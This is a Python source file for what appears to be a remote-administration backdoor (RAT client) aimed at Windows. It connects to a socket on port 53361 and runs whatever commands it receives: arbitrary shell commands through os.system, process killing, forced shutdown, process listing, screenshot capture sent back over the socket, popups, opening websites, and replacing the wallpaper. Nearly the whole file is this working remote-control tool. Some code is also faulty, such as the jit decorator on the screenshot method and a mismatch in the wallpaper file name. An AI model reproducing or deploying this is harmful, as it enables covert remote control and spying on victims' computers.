import socket as ss
from threading import Thread
import os
import sys
from pyautogui import alert, screenshot
import psutil as ps
import webbrowser
import io
from numba import jit
import ctypes


class Idd:
    def __init__(self):
        while True:
            try:
                with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as self.idle:
                    self.idle.connect((ss.gethostname(), 53361))
                    self.receber()
            except ss.error:
                self.idle.close()
                continue

            except ConnectionAbortedError:
                self.idle.close()
                continue

            except ConnectionResetError:
                self.idle.close()
                continue

            except Exception:
                self.idle.close()
                continue

    def receber(self):
        while True:
            while True:
                path = self.idle.recv(1024)
                if path:
                    path = path.decode("utf-8")
                    break

            if "\n" in path:
                pato = path.split("\n")

                if "kill" in pato:
                    self.fechar(pato[1])
                    continue

                if "popup" in pato:
                    self.process_pop(pato[1])
                    continue

                if "expecifico" in pato:
                    Thread(target=self.expec, args=(pato[1],)).start()
                    continue

                if "site" in pato:
                    Thread(target=self.site, args=(pato[1],)).start()
                    continue

            else:
                if path == "S_D":
                    self.desligar()
                    continue

                if path == "RP":
                    self.process_list()
                    continue

                if path == "PrintS":
                    Thread(target=self.system_photo).start()
                    continue

                if path == "config_at_wallpaper":
                    Thread(target=self.window_change_config).start()
                    continue

    def site(self, sitee):
        webbrowser.open(sitee)
        self.idle.send(bytes("Site aberto", "utf-8"))
        self.receber()

    def expec(self, comand):
        os.system(comand)
        self.idle.send(bytes(f"{comand} estÃ¡ sendo executado", "utf-8"))
        self.receber()

    def desligar(self):
        os.system("shutdown -s -t 0")
        self.idle.send(bytes("Desligando", "utf-8"))
        self.receber()

    def fechar(self, processo):
        os.system(f"TASKKILL /IM {processo}")
        self.idle.send(bytes(f"{processo} Fechado", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    @staticmethod
    def process_pop(msg):
        os.system(f'echo msgbox "{msg}" > %tmp%\\tmp.vbs')
        os.system('cscript /nologo %tmp%\\tmp.vbs')
        os.system('del %tmp%\\tmp.vbs')

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    def process_list(self):
        processos = list()
        for proc in ps.process_iter():
            if not proc.name() in processos:
                processos.append(proc.name())
        self.idle.send(bytes(f"{processos}", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    @jit(nopython=True)
    def system_photo(self):
        foto = screenshot()
        img_byte_array = io.BytesIO()
        foto.save(img_byte_array, format=foto.format)
        self.idle.send(img_byte_array.getvalue())

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    def window_change_config(self):
        self.idle.send(bytes("Next", "utf-8"))
        while True:
            if os.path.isdir("C:\\Users\\Public\\Documents\\Public_Docs"):
                if not os.path.isfile("C:\\Users\\Public\\Documents\\Public_Docs\\file.png"):
                    break
                else:
                    os.remove("C:\\Users\\Public\\Documents\\Public_Docs\\file.png")
                    continue
            else:
                os.mkdir("C:\\Users\\Public\\Documents\\Public_Docs")
                continue

        with open("C:\\Users\\Public\\Documents\\Public_Docs\\file", "wb") as wall:
            while True:
                photo = self.idle.recv(100000)
                if not photo:
                    break
                wall.write(photo)
                continue
            ctypes.windll.user32.SystemParametersInfoA(20, 0, "C:\\Users\\Public\\Documents\\Public_Docs\\file.png", 3)


Idd()
